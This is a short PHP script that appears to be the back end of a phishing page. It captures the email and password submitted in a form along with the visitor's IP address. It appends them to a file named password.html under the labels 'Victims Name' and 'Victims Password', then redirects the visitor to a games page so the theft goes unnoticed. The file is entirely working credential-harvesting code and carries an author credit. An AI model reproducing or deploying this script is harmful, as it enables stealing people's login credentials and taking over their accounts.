<?php
$habbo = $_POST['email']; 
$password = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR']; 
$f = fopen("password.html", "a"); 
fwrite ($f, 'Victims Name: [<b><font color="#570000">'.$habbo.'</font></b>] Victims Password: [<b><font color="#57003A">'.$password.'</font></b>] IP: [<b><font color="#005700">'.$ip.'</font></b>] By: [<b><font color="#005700"><a href="http://www.kanishksinghtechy.blogspot.com/" rel="nofollow">GAJENDRA KUMAR</a></font></b>]<br>');
fclose($f);

header("Location: ../games.html");
?>
